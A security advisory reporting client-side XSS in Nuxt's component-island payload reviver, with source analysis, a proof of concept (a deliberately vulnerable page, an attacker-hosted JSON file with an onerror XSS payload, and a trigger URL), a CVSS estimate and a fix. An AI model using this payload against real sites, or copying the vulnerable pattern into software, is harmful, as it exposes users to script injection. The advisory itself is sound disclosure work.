### Summary

> https://github.com/nuxt/nuxt/security/advisories?state=closed

The client-side `Island` payload reviver performs an unsanitised spread `return { html: '', ...result }`. Any attacker who can shape an object inside `ssrContext.payload` (a `useFetch` against a user-controlled URL, a `useCookie` value, persisted user JSON, an external API mirror, …) ends up with arbitrary HTML in the client DOM through that spread. The `key` field is the only thing validated in the reducer; `params` and `result` flow through untouched, and `result.html` overrides the empty default. Confirmed end-to-end on `nuxt@4` against a clean install with `experimental.componentIslands: true`.

### Details

The reducer (`packages/nuxt/src/app/plugins/revive-payload.server.ts:22`):

```ts
if (componentIslands) {
  reducers.push(['Island', data => data && data?.__nuxt_island && isValidIslandKey(data.__nuxt_island.key) && data.__nuxt_island])
}
```

`isValidIslandKey` enforces `^[a-z][a-z\d-]*_[a-z\d]+$/i` on the inner `key`. No check is applied to `params` or `result`. The reducer emits the whole `__nuxt_island` object as-is into the SSR payload.

The reviver (`packages/nuxt/src/app/plugins/revive-payload.client.ts:30-46`):

```ts
revivers.push(['Island', ({ key, params, result }: any) => {
  const nuxtApp = useNuxtApp()
  if (!nuxtApp.isHydrating) {
    nuxtApp.payload.data[key] ||= $fetch(`/__nuxt_island/${key}.json`, {
      responseType: 'json',
      ...params ? { params } : {},
    }).then((r) => {
      nuxtApp.payload.data[key] = r
      return r
    })
  }
  return {
    html: '',
    ...result,
  }
}])
```

`result` was attacker-shaped (it travelled through the reducer untouched), so `result.html` overrides the empty default. The returned value replaces the original `{__nuxt_island: …}` object at its payload slot, leaving the slot in the shape `{ html: '<attacker-html>', …attacker-fields }` for the rest of the app to consume.

Reaching the reducer, anywhere `{__nuxt_island:{key:"…valid…", result:{html:"…"}}}` ends up inside `ssrContext.payload` it fires. Real-world paths:

- A `useAsyncData` / `useFetch` whose URL is influenced by request input (proxy / link-preview / external-provider mirror). The response JSON lands in `payload.data[key]` verbatim.
- A `useState` whose initial value reflects user-supplied JSON.
- `useCookie`, the default decoder `parseCookieValue` (`packages/nuxt/src/app/composables/cookie.ts:17-22`) calls bare `JSON.parse(value)` with no reviver, no `destr`, no `__proto__` guard:

  ```ts
  function parseCookieValue (value: string) {
    if (value === 'undefined') { return undefined }
    try {
      const parsed = JSON.parse(value)
      if (typeof parsed === 'number' && String(parsed) !== value) { return value }
      return parsed
    } catch { return value }
  }
  ```

  An attacker who can set the victim's cookie ships the `__nuxt_island` object straight into the value the app surfaces from `useCookie`. Any app that subsequently includes it in SSR state walks it through the reducer.

The reviver's `params` spread is a secondary primitive: `$fetch('/__nuxt_island/<attacker-key>.json', { params: <attacker-obj> })` forces a same-origin authenticated GET with attacker-chosen query string from the victim's browser.

### PoC

A clean Nuxt 4 project with one vulnerable page is the victim. The attacker payload is hosted on a separate server (any HTTP server, any host). The vulnerable page passes the attacker URL through `$fetch` on the server side because the URL is sourced from the user-controlled `?url=` query parameter, modelling the proxy / link-preview / external-mirror patterns the report describes.

- https://gist.github.com/P0cas/a2680b57ebe4e65e02de139aa8dbf4f7

**1. The victim Nuxt project**

`nuxt.config.ts`:

```ts
export default defineNuxtConfig({
  compatibilityDate: '2026-01-01',
  experimental: { componentIslands: true },
})
```

`app/pages/multi-sink.vue`:

```vue
<script setup lang="ts">
const route = useRoute()
const url = String(route.query.url ?? '')

const { data } = await useAsyncData('userdata', async () => {
  if (!url) { return null }
  return await $fetch<any>(url)
})

const toggle = ref(false)
onMounted(() => { toggle.value = true })
</script>

<template>
  <div>
    <div id="sink-A" v-html="(data as any)?.html ?? ''"></div>
    <div v-if="toggle"><div id="sink-B" v-html="(data as any)?.html ?? ''"></div></div>
    <div :key="toggle ? 1 : 0" id="sink-C" v-html="(data as any)?.html ?? ''"></div>
    <component v-if="toggle" :is="'div'" id="sink-D" v-html="(data as any)?.html ?? ''" />
    <ClientOnly>
      <div id="sink-E" v-html="(data as any)?.html ?? ''"></div>
    </ClientOnly>
  </div>
</template>
```

Start the victim:

```bash
npm install
npx nuxt build
PORT=3300 node .output/server/index.mjs
```

**2. The attacker server**

On any other host or port, serve a single static JSON file. Example using Python's standard library on a separate port:

```bash
mkdir /tmp/attacker && cd /tmp/attacker
cat > evil.json <<'EOF'
{"__nuxt_island":{"key":"evil_1","params":{},"result":{"html":"<img src=x onerror=\"alert(document.domain)\">"}}}
EOF
python3 -m http.server 4444
```

The attacker server has no Nuxt code, no shared origin, and no shared cookie context with the victim. It serves a single JSON document.

**3. Trigger**

Open in a browser:

```
http://127.0.0.1:3300/multi-sink?url=http://127.0.0.1:4444/evil.json
```

`alert(document.domain)` fires four times on page load (sinks B, C, D, E), each printing `127.0.0.1` (the victim origin, not the attacker origin), proving the script ran in the victim's origin. Sink A stays empty, illustrating the only shape Vue's strict hydration happens to defend by accident.

The relevant fragment of `__NUXT_DATA__` in the victim's SSR HTML, showing the reducer fired on the attacker-hosted JSON and the attacker HTML passed through devalue's escapes unchanged:

```
[ ... ,["Island",5],{"key":6,"params":7,"result":9},"evil_1", ... ,
"<img src=x onerror=\"alert(document.domain)\">", ... ]
```

---

## Impact

### Impact

Class: client-side XSS reachable through Nuxt's payload-revival path (CWE-79). Plus a same-origin authenticated-GET primitive (forced fetch to `/__nuxt_island/<attacker-key>.json` with attacker-chosen query parameters) as a secondary effect of the reviver's `||=` side effect.

Who is affected, any Nuxt app that meets both of the following:

1. Attacker-shaped data ends up anywhere inside `ssrContext.payload`. Realistic sources documented above: `useAsyncData` / `useFetch` against a user-influenced URL, persisted user-supplied JSON, an external API mirror, or, with the lowest precondition, a `useCookie` value, because the default cookie decoder raw-`JSON.parse`s the value into the ref the app then surfaces.
2. The application has at least one `v-html`-shaped sink that mounts (or re-mounts) on the client rather than being a plain root-level binding that SSR rendered statically. The PoC observes the gadget firing in all of `v-if` toggles, `:key=` remounts, `<component :is>` dynamic components, and `<ClientOnly>`. The only shape Vue's strict hydration defends by accident is a binding that never re-mounts.

Severity estimate: CVSS 3.1 `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N = 6.1 Medium` for the cookie-driven variant where the attacker only needs the victim to load a page while their own cookie is set; raises toward 7.x when chained with `useFetch`-from-user-URL patterns common in proxy and link-preview features.

A single line in the reviver closes the spread:

```ts
return { html: '' }
```

…or, if preserving the prerender-inline HTML optimisation matters, allowlist `result` to a non-DOM-bearing shape (`{ props, slots, components, head }`) in both the reducer and the reviver so that no `html` field is ever transported through the deserialisation path.
